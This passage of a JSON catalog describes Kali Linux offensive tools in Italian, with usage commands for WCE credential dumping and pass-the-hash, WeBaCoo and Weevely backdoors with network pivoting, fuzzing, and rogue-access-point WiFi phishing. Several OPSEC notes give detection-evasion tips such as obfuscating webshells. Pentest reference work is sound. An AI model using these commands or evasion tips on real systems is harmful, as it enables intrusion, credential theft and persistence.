    "name": "wce",
    "version": "1.42",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wce/",
    "desc": "Windows Credentials Editor: dump hash, pass-the-hash, token impersonation.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>WCE</strong> (Windows Credentials Editor) è uno strumento per manipolare credenziali Windows in memoria. Permette di estrarre hash NTLM, eseguire pass-the-hash, listare sessioni logon e impersonare token di sicurezza per privilege escalation e lateral movement.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Hash Dump:</strong> estrae hash NTLM e password in chiaro dalla memoria LSASS</p><p><strong>Pass-the-Hash:</strong> autentica con hash NTLM senza conoscere la password</p><p><strong>Token Manipulation:</strong> lista e impersona token di sicurezza di altri utenti</p><p><strong>Session Listing:</strong> enumera sessioni logon attive con dettagli credenziali</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Dump credenziali con WDigest cleartext\nwce.exe -w -v\n\n# Pass-the-Hash per aprire cmd come altro utente\nwce.exe -s Administrator:DOMAIN:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\ncmd.exe /c \"whoami &amp;&amp; net user\"\n\n# Refresh credenziali in sessione corrente\nwce.exe -r\n\n# Dump e salvataggio per cracking offline\nwce.exe -l -o creds_dump.txt\nhashcat -m 1000 creds_dump.txt rockyou.txt\n\n# Lista token e impersona SYSTEM\nwce.exe -e\nwce.exe -i -s NT AUTHORITY\\SYSTEM\n\n# PTH per PsExec remoto\nwce.exe -s admin:CORP:hash:hash &amp;&amp; \\\n  psexec.exe \\\\targetpc cmd.exe</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Credential Harvesting</strong>, estrarre credenziali da sistemi compromessi.</p><p>Per <strong>Lateral Movement</strong>, usare hash per accedere ad altri sistemi nel dominio.</p><p>Per <strong>Privilege Escalation</strong>, impersonare token di utenti privilegiati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> accesso a LSASS è monitorato da EDR e genera eventi Sysmon. WCE è signature nota per tutti gli antivirus. NTLM pass-the-hash lascia tracce nei log di sicurezza. Preferire alternative moderne come Mimikatz con offuscamento.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "web-cache-vulnerability-scanner",
    "name": "web-cache-vulnerability-scanner",
    "version": "1.4.3",
    "icon": "../app/icons/web-cache-vulnerability-scanner-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/web-cache-vulnerability-scanner/",
    "desc": "Rileva vulnerabilità web cache poisoning e deception per attacchi su CDN e proxy.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Web Cache Vulnerability Scanner è uno strumento specializzato per identificare vulnerabilità di web cache poisoning e cache deception. Testa CDN, reverse proxy e sistemi di caching per trovare configurazioni che permettono di avvelenare cache o rubare dati di altri utenti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Cache Poisoning:</strong> identifica header e parametri che permettono di avvelenare la cache</p><p><strong>Cache Deception:</strong> trova path che espongono dati sensibili di altri utenti via cache</p><p><strong>Key Detection:</strong> analizza quali elementi compongono la cache key</p><p><strong>Automated Testing:</strong> test automatici per varianti note di cache vulnerability</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansione base\nweb-cache-vulnerability-scanner -u https://target.com\n\n# Test specifico per poisoning\nweb-cache-vulnerability-scanner -u https://target.com --poisoning\n\n# Con wordlist custom per path\nweb-cache-vulnerability-scanner -u https://target.com -w paths.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>CDN Security</strong>, verificare configurazione sicura di Cloudflare, Akamai e altri CDN.</p><p>Per <strong>Cache Poisoning</strong>, testare possibilità di iniettare contenuto malevolo nella cache.</p><p>Per <strong>Data Exposure</strong>, identificare cache deception che espone dati utente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> header anomali nei test sono loggati. Cache poisoning reale può impattare altri utenti. Test di deception possono esporre dati sensibili. Eseguire solo con autorizzazione esplicita.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "webacoo",
    "name": "webacoo",
    "version": "0.2.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/webacoo/",
    "desc": "Web backdoor cookie-based per comunicazione stealth con webshell via cookie HTTP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>WeBaCoo</strong> (Web Backdoor Cookie) è un generatore di webshell stealth che nasconde comunicazioni nei cookie HTTP. I comandi vengono inviati tramite cookie encoded e le risposte tornano nello stesso modo, evitando detection basata su parametri URL o body delle request.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Cookie Communication:</strong> canale di comando nascosto nei cookie HTTP</p><p><strong>Base64 Obfuscation:</strong> encoding dei comandi per evitare detection pattern-based</p><p><strong>PHP Backdoor:</strong> genera webshell PHP minimale e offuscata</p><p><strong>Terminal Mode:</strong> shell interattiva per eseguire comandi sul server</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Genera backdoor\nwebacoo -g -o backdoor.php\n\n# Connetti alla backdoor\nwebacoo -t -u http://target.com/backdoor.php\n\n# Specifica cookie name custom\nwebacoo -g -o backdoor.php -c CustomCookie</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Stealth Persistence</strong>, mantenere accesso con comunicazioni difficili da rilevare.</p><p>Per <strong>WAF Bypass</strong>, evitare detection che analizza solo URL e body.</p><p>Per <strong>Post-Exploitation</strong>, shell nascosta dopo upload iniziale.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> cookie anomali possono essere analizzati da WAF avanzati. File PHP rimane sul filesystem e può essere trovato. Pattern base64 nei cookie sono signature riconoscibile. Usare encryption custom per maggiore stealth.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Persistence"
    ],
    "notes": null
  },
  {
    "id": "webshells",
    "name": "webshells",
    "version": "1.1",
    "icon": "../app/icons/webshells-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/webshells/",
    "desc": "Collezione di webshell PHP, ASP, JSP, ASPX per post-exploitation su server web.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Webshells</strong> è una collezione curata di webshell per diverse tecnologie server-side (PHP, ASP, ASPX, JSP, CFM). Include shell minimali per evasion, shell con GUI completa, e varianti specializzate per diverse necessità di post-exploitation.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Language:</strong> webshell per PHP, ASP, ASPX, JSP e altri linguaggi server</p><p><strong>Feature Variety:</strong> da one-liner a shell complete con file manager e database access</p><p><strong>Size Options:</strong> shell minimali per evasion o complete per funzionalità avanzate</p><p><strong>Ready to Use:</strong> shell pronte per upload dopo file upload vulnerability</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Localizzazione shell\nls /usr/share/webshells/\n\n# Shell PHP semplice\ncat /usr/share/webshells/php/simple-backdoor.php\n\n# Shell ASPX\ncat /usr/share/webshells/aspx/cmdasp.aspx</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Post-Exploitation</strong>, mantenere accesso dopo sfruttamento di file upload.</p><p>Per <strong>Pivoting</strong>, usare server web compromesso per accedere a rete interna.</p><p>Per <strong>Reference</strong>, studiare tecniche di webshell per detection e hunting.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> webshell note sono signature in tutti gli AV e WAF. Upload lascia tracce nei log server. File anomali rilevati da file integrity monitoring. Modificare e offuscare shell prima dell'uso in engagement reali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Persistence"
    ],
    "notes": null
  },
  {
    "id": "websploit",
    "name": "websploit",
    "version": "4.0.4",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/websploit/",
    "desc": "Framework per vulnerability scanning e exploit web con moduli automatizzati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>WebSploit</strong> è un framework modulare per penetration testing web e network. Combina scanner di vulnerabilità, moduli di exploit e tool di social engineering in un'interfaccia unificata simile a Metasploit per attacchi automatizzati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Web Modules:</strong> scanner per vulnerabilità web comuni e CMS specifici</p><p><strong>Network Attacks:</strong> moduli per ARP spoofing, DNS hijacking e MITM</p><p><strong>Social Engineering:</strong> integrazione con tool di phishing e credential harvesting</p><p><strong>Autopwn:</strong> sfruttamento automatico di vulnerabilità rilevate</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia WebSploit\nwebsploit\n\n# Lista moduli disponibili\nshow modules\n\n# Usa modulo specifico\nuse web/dir_scanner\n\n# Configura target\nset target http://target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Automated Testing</strong>, scansione rapida di applicazioni web per vulnerabilità note.</p><p>Per <strong>Network Attacks</strong>, eseguire attacchi MITM e spoofing in ambiente controllato.</p><p>Per <strong>Learning</strong>, comprendere diverse tecniche di attacco in framework unificato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> moduli generano traffico facilmente identificabile. Pattern di attacco sono signature note. MITM e spoofing causano anomalie di rete evidenti. Usare solo in ambiente lab o con autorizzazione esplicita.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Proxy_MITM"
    ],
    "notes": null
  },
  {
    "id": "weevely",
    "name": "weevely",
    "version": "4.0.2",
    "icon": "../app/icons/weevely-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/weevely/",
    "desc": "Webshell PHP stealth con crittografia, 30+ moduli per post-exploitation avanzata.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Weevely</strong> è una webshell PHP stealth progettata per post-exploitation avanzata. Genera backdoor offuscate con comunicazione crittografata e offre 30+ moduli per file management, pivoting, privilege escalation e persistence su server web compromessi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Encrypted Communication:</strong> traffico C2 crittografato nascosto in parametri legittimi</p><p><strong>30+ Modules:</strong> file manager, port scanner, SQL client, bruteforcer integrati</p><p><strong>Obfuscated Agent:</strong> backdoor PHP minimale e offuscata per evitare detection</p><p><strong>Pivoting:</strong> tunnel TCP e proxy SOCKS per accesso a rete interna</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Genera backdoor con obfuscation avanzata\nweevely generate Str0ngP4ss! /tmp/agent.php\n\n# Connetti e avvia sessione interattiva\nweevely http://target.com/uploads/agent.php Str0ngP4ss!\n\n# Moduli post-exploitation avanzati:\n:system_info              # Info sistema\n:audit_phpconf            # Audit configurazione PHP\n:file_find / -name *.conf # Cerca file configurazione\n:sql_console -user root -passwd '' -host localhost  # MySQL shell\n\n# Pivoting: crea tunnel SOCKS\n:net_proxy                # SOCKS5 per accesso rete interna\nproxychains nmap -sT 10.0.0.0/24\n\n# Port forwarding per accesso servizi interni\n:net_portfwd -lport 3306 -rhost 10.0.0.5 -rport 3306\nmysql -h 127.0.0.1 -P 3306 -u root\n\n# Privilege escalation enumeration\n:audit_suidsgid           # Trova SUID/SGID\n:audit_etcpasswd          # Check permessi /etc/passwd</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Stealth Persistence</strong>, mantenere accesso con comunicazioni crittografate difficili da rilevare.</p><p>Per <strong>Post-Exploitation</strong>, eseguire reconnaissance e lateral movement da server web.</p><p>Per <strong>Pivoting</strong>, usare server compromesso come punto di ingresso nella rete.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> file PHP può essere trovato da scansioni AV server-side. Pattern di comunicazione, seppur crittografati, hanno caratteristiche rilevabili. Moduli aggressivi generano attività anomala. Usare con cautela e cleanup appropriato.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Persistence"
    ],
    "notes": null
  },
  {
    "id": "wfuzz",
    "name": "wfuzz",
    "version": "3.1.0",
    "icon": "../app/icons/wfuzz-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wfuzz/",
    "desc": "Fuzzer web per brute force directory, parametri, header e autenticazione.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Wfuzz</strong> è un fuzzer web flessibile per brute force di directory, parametri, header e autenticazione. Supporta injection di payload in qualsiasi parte della request HTTP con filtering avanzato delle risposte per identificare risultati interessanti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Position Fuzzing:</strong> inietta payload in URL, header, body, cookie simultaneamente</p><p><strong>Advanced Filtering:</strong> filtra risposte per status code, lunghezza, parole, linee, regex</p><p><strong>Encoders:</strong> encoding automatico dei payload (URL, base64, HTML, hash)</p><p><strong>Recursion:</strong> fuzzing ricorsivo per directory discovery approfondita</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Directory bruteforce con estensioni multiple\nwfuzz -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\\n  -z list,-.php-.html-.txt-.bak --hc 404 http://target.com/FUZZFUZ2Z\n\n# IDOR testing con range numerico\nwfuzz -c -z range,1-1000 --hc 403,404 --hh 0 http://target.com/api/user/FUZZ/profile\n\n# Auth bypass con header injection\nwfuzz -c -w /usr/share/seclists/Fuzzing/headers-injection.txt \\\n  -H \"X-Forwarded-For: FUZZ\" --hc 403 http://target.com/admin\n\n# Subdomain bruteforce via Host header\nwfuzz -c -w subdomains.txt -H \"Host: FUZZ.target.com\" --hc 404 --hw 0 http://target.com\n\n# SQLi fuzzing su parametro POST\nwfuzz -c -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt \\\n  -d \"username=admin&amp;password=FUZZ\" --hs \"Invalid\" http://target.com/login\n\n# Recursive discovery con output JSON\nwfuzz -c -R 2 -w wordlist.txt --hc 404 -o json http://target.com/FUZZ 2&gt;results.json\n\n# Multi-threading con delay per evasione\nwfuzz -c -t 5 -s 0.5 -w wordlist.txt --hc 404 http://target.com/FUZZ</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Content Discovery</strong>, trovare file, directory e endpoint nascosti.</p><p>Per <strong>Parameter Brute Force</strong>, identificare parametri accettati da endpoint.</p><p>Per <strong>Auth Testing</strong>, testare credenziali e bypass autenticazione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> alto volume di request genera alert su WAF e IDS. Pattern di fuzzing sono facilmente identificabili. Rate limiting può bloccare scansione. Usare delay tra request e proxy rotation per ridurre detection.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "whatweb",
    "name": "whatweb",
    "version": "0.6.2",
    "icon": "../app/icons/whatweb-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/whatweb/",
    "desc": "Identifica tecnologie web: CMS, framework, server, plugin con 1800+ fingerprint.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>WhatWeb</strong> è uno scanner di fingerprinting web che identifica tecnologie utilizzate dai siti web. Con oltre 1800 plugin integrati riconosce CMS, framework, server web, librerie JavaScript, widget, piattaforme e-commerce, analytics e centinaia di altre componenti analizzando header HTTP, contenuto HTML, cookie, comportamenti specifici e pattern unici. È uno strumento essenziale nella fase di reconnaissance per comprendere lo stack tecnologico di un target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>1800+ Detection Plugins:</strong> riconoscimento esteso di CMS (WordPress, Joomla, Drupal, Magento), framework (Laravel, Django, Rails, Spring), server (Apache, nginx, IIS), analytics (Google Analytics, Matomo), CDN (Cloudflare, Akamai), WAF e molto altro con aggiornamenti continui della community.</p><p><strong>Aggression Levels:</strong> quattro livelli di aggressività da stealthy (singola request, minimo footprint) ad aggressive (multiple probe, path brute force) per bilanciare detection rate e stealth in base al contesto operativo.</p><p><strong>Version Detection:</strong> identifica versioni specifiche di software tramite changelog, hash di file statici, header e pattern HTML per vulnerability matching preciso e ricerca CVE mirata.</p><p><strong>Flexible Output Formats:</strong> output in JSON, XML, SQL, MongoDB, brief e verbose per integrazione in pipeline automatizzate, database di asset e tool di reporting.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan singolo target con output standard\nwhatweb https://target.com\n\n# Scan aggressivo livello 3 per maximum detection\nwhatweb -a 3 -v https://target.com\n\n# Output JSON per integrazione pipeline\nwhatweb --log-json=output.json https://target.com\n\n# Scan range IP con throttling\nwhatweb --wait=2 192.168.1.0/24\n\n# Scan da file di URL\nwhatweb -i urls.txt --log-json=results.json\n\n# Con custom User-Agent e proxy\nwhatweb -U \"Mozilla/5.0 (Windows NT 10.0)\" --proxy http://127.0.0.1:8080 https://target.com\n\n# Solo plugin specifici\nwhatweb -p WordPress,Apache https://target.com\n\n# Verbose con colori per analisi manuale\nwhatweb -v --color=always https://target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Technology Profiling</strong>, mappare completamente lo stack tecnologico di applicazioni web target identificando CMS, framework, server, librerie frontend e servizi third-party per pianificare vettori di attacco specifici.</p><p>Per <strong>Vulnerability Research</strong>, identificare versioni esatte di software per cercare CVE note, exploit pubblici e configurazioni vulnerabili conosciute, correlando con database come NVD e Exploit-DB.</p><p>Per <strong>Asset Discovery Enterprise</strong>, catalogare tecnologie su range di IP aziendali per inventory management, compliance checking e identificazione di shadow IT non autorizzato.</p><p>Per <strong>Bug Bounty Reconnaissance</strong>, profilare rapidamente target di programmi bug bounty per identificare tecnologie con history di vulnerabilità note.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> livello aggressivo genera multiple request rilevabili da WAF e IDS. User-Agent WhatWeb è signature nota facilmente identificabile. Scansione di range genera traffico anomalo che può triggare alert. Usare livello passivo (aggression 1), custom User-Agent, proxy rotation e throttling per ridurre fingerprint durante operazioni stealth.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "HTTP_Analysis"
    ],
    "notes": null
  },
  {
    "id": "wifi-honey",
    "name": "wifi-honey",
    "version": "1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wifi-honey/",
    "desc": "Crea fake AP per cattura handshake WPA/WPA2 con deauth e beacon spoofing.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>WiFi-Honey</strong> è uno script specializzato che automatizza la creazione di rogue access point (evil twin) per catturare handshake WPA/WPA2. Configura intelligentemente multiple interfacce wireless virtuali per creare AP fake con lo stesso ESSID del target mentre simultaneamente esegue attacchi deauth coordinati per forzare i client a riconnettersi all'access point malevolo. È un tool essenziale per wireless penetration testing che semplifica setup complessi di attacchi evil twin.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Automated Rogue AP Setup:</strong> crea automaticamente access point fake con ESSID identico al target, configurando hostapd, dnsmasq e le interfacce necessarie senza intervento manuale per rapid deployment durante engagement.</p><p><strong>Coordinated Deauth Attack:</strong> esegue attacchi deauthentication simultanei contro i client connessi al vero AP usando aireplay-ng, forzandoli a cercare un nuovo access point e connettersi al rogue AP controllato dall'attaccante.</p><p><strong>4-Way Handshake Capture:</strong> cattura automaticamente il 4-way handshake WPA/WPA2 quando i client si riconnettono, salvando i dati in formato compatibile con aircrack-ng e hashcat per offline password cracking.</p><p><strong>Multi-Interface Orchestration:</strong> gestisce multiple interfacce wireless simultaneamente - una per il rogue AP, una per il deauth attack, e opzionalmente una per monitoring - coordinando le operazioni per massimizzare l'efficacia dell'attacco.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia wifi-honey con parametri base\nwifi-honey &lt;essid&gt; &lt;channel&gt; &lt;interface&gt;\n\n# Esempio attacco a rete \"CorporateWiFi\" su canale 6\nwifi-honey CorporateWiFi 6 wlan0\n\n# Con interfaccia specifica per monitoring\nwifi-honey TargetNetwork 11 wlan0 wlan1\n\n# Monitora handshake catturati in real-time\nairodump-ng --bssid &lt;rogue_mac&gt; -c &lt;channel&gt; -w capture wlan0mon\n\n# Verifica cattura handshake\naircrack-ng capture*.cap\n\n# Crack offline con wordlist\naircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi Penetration Testing</strong>, testare la resistenza di reti wireless aziendali ad attacchi evil twin verificando se i client si connettono automaticamente ad AP non autorizzati.</p><p>Per <strong>WPA/WPA2 Password Audit</strong>, ottenere handshake per password cracking offline e verificare la robustezza delle passphrase wireless contro attacchi dictionary e brute force.</p><p>Per <strong>Client Security Assessment</strong>, verificare il comportamento dei dispositivi client quando presentati con AP duplicati, testando se validano correttamente i certificati o si connettono ciecamente.</p><p>Per <strong>Security Awareness Training</strong>, dimostrare visivamente i rischi degli attacchi evil twin durante training di security awareness per utenti e IT staff.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> beacon frame duplicati con stesso ESSID ma BSSID diverso sono facilmente rilevabili da WIDS enterprise. Deauth flood genera alert immediati su sistemi di monitoring wireless. Richiede prossimità fisica al target (range wireless). Interferenza RF anomala può essere localizzata con equipment di spectrum analysis. Usare solo con autorizzazione esplicita in ambiente controllato durante penetration test autorizzati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "wifiphisher",
    "name": "wifiphisher",
    "version": "1.4",
    "icon": "../app/icons/wifiphisher-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wifiphisher/",
    "desc": "Framework rogue AP per phishing WiFi: cattura credenziali con captive portal fake.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Wifiphisher</strong> è un framework per attacchi rogue AP che automatizza phishing WiFi tramite captive portal fake. Crea access point malevoli, disconnette utenti dalla rete legittima e presenta pagine di phishing per catturare password WPA, credenziali o distribuire malware.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Automated Deauth:</strong> disconnette automaticamente client dalla rete target</p><p><strong>Phishing Scenarios:</strong> template preconfigurati per firmware update, OAuth, captive portal</p><p><strong>Credential Capture:</strong> cattura password WiFi, login social, credenziali custom</p><p><strong>KARMA Attack:</strong> risponde a probe request di reti memorizzate dai client</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia wifiphisher interattivo\nsudo wifiphisher\n\n# Specifica interfaccia e scenario\nsudo wifiphisher -i wlan0 -p firmware-upgrade\n\n# Target specifico\nsudo wifiphisher --essid \"TargetNetwork\" -p oauth-login</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi Phishing</strong>, testare consapevolezza utenti su attacchi evil twin.</p><p>Per <strong>Credential Harvesting</strong>, catturare password WiFi o credenziali in engagement autorizzati.</p><p>Per <strong>Social Engineering</strong>, distribuire payload tramite pagine di aggiornamento fake.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> rogue AP e deauth sono rilevabili da WIDS enterprise. Captive portal può essere identificato da utenti attenti. Richiede prossimità fisica. Attività è illegale senza autorizzazione esplicita.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "wifipumpkin3",
    "name": "wifipumpkin3",
    "version": "1.1.7",
    "icon": "../app/icons/wifipumpkin3-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wifipumpkin3/",
    "desc": "Rogue AP framework con proxy, credential capture, MITM e plugin extensibility.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>WiFi-Pumpkin3 è un framework avanzato per attacchi rogue AP con capacità MITM complete. Crea access point malevoli con proxy trasparente, cattura credenziali, inietta JavaScript, e offre architettura a plugin per estendere funzionalità di intercettazione e phishing.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Rogue AP:</strong> crea AP con DHCP, DNS e routing automatici</p><p><strong>Transparent Proxy:</strong> intercetta traffico HTTP/HTTPS con SSLstrip</p><p><strong>Plugin System:</strong> moduli per JS injection, credential capture, image replacement</p><p><strong>Captive Portal:</strong> template phishing personalizzabili per social engineering</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia wifipumpkin3\nsudo wifipumpkin3\n\n# Configura AP\nwp3> set interface wlan0\nwp3> set ssid FreeWiFi\n\n# Avvia con proxy\nwp3> start\n\n# Abilita plugin\nwp3> use proxy</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>MITM Testing</strong>, intercettare traffico in assessment wireless autorizzati.</p><p>Per <strong>Credential Capture</strong>, catturare login trasmessi su connessioni non sicure.</p><p>Per <strong>Security Awareness</strong>, dimostrare rischi di reti WiFi pubbliche.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> rogue AP è rilevabile da WIDS e wireless IPS. Proxy intercept può generare warning certificato. Attività MITM lascia tracce nei log. Usare solo in ambiente controllato con autorizzazione.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "wifite",
    "name": "wifite",
    "version": "2.7.0",
    "icon": "../app/icons/wifite-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wifite/",
    "desc": "Auditing WiFi automatizzato: scansione, deauth, cattura handshake e crack WPA/WEP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Wifite</strong> è uno strumento automatizzato all-in-one per auditing di reti WiFi che orchestra l'intero processo di attacco wireless dalla scansione al cracking. Analizza automaticamente le reti disponibili, seleziona i target in base a criteri configurabili, esegue gli attacchi più appropriati per ogni tipo di protezione (WEP, WPA, WPA2, WPS) e integra seamlessly con tool di cracking per un workflow completo e hands-off. È il tool preferito per wireless penetration testing rapido ed efficiente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Fully Automated Workflow:</strong> gestisce automaticamente l'intero processo di attacco WiFi dalla scansione iniziale alla cattura handshake, selezionando strategie ottimali senza intervento manuale e permettendo di lasciare il tool in esecuzione mentre si lavora su altro.</p><p><strong>Multi-Protocol Attack Support:</strong> supporta attacchi completi per WEP (ARP replay, chopchop, fragmentation, caffe-latte), WPA/WPA2 (deauthentication, PMKID capture), e WPS (Pixie-Dust, Reaver brute force, null PIN) con fallback automatico tra tecniche.</p><p><strong>Smart Target Selection:</strong> seleziona automaticamente gli attacchi più efficaci basandosi sulle caratteristiche del target - potenza segnale, client connessi, WPS enabled, encryption type - prioritizzando target con maggiore probabilità di successo.</p><p><strong>Extensive Tool Integration:</strong> integra nativamente aircrack-ng suite, hashcat, reaver, bully, pixiewps, hcxdumptool, tshark e altri tool specializzati, orchestrando l'esecuzione e parsando automaticamente i risultati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia wifite in modalità interattiva\nsudo wifite\n\n# Target specifico per ESSID\nsudo wifite --essid \"CorporateWiFi\"\n\n# Solo reti WPA/WPA2 (skip WEP e WPS)\nsudo wifite --wpa --no-wps\n\n# Attacca tutti i target continuamente\nsudo wifite --all --infinite\n\n# PMKID attack only (più stealth, no deauth)\nsudo wifite --pmkid --no-deauth\n\n# Con kill timeout e potenza minima\nsudo wifite --kill-timeout 60 --pow 50\n\n# Crack con wordlist custom\nsudo wifite --dict /usr/share/wordlists/rockyou.txt\n\n# Skip cracking, solo capture\nsudo wifite --no-crack --wpa</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Enterprise WiFi Assessment</strong>, condurre assessment automatizzato di sicurezza wireless su reti aziendali, identificando rapidamente access point vulnerabili e catturando materiale per password audit.</p><p>Per <strong>WPA/WPA2 Password Audit</strong>, verificare la robustezza delle passphrase wireless catturando handshake e testando contro wordlist comuni per identificare password deboli.</p><p>Per <strong>WPS Vulnerability Testing</strong>, identificare access point con WPS enabled vulnerabili a Pixie-Dust o brute force, che permettono bypass completo della password WPA.</p><p>Per <strong>Continuous Monitoring</strong>, eseguire scansioni continue durante engagement prolungati per catturare handshake quando client si connettono.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> attacchi deauth e packet injection sono facilmente rilevabili da WIDS enterprise e generano alert immediati. Handshake capture richiede prossimità fisica alla rete target. PMKID attack è più stealth ma comunque rilevabile. Il cracking avviene offline ma gli hash catturati possono essere correlati se leaked. Usare solo su reti autorizzate con permesso esplicito scritto.</p><br><hr>",
    "best_in": true,
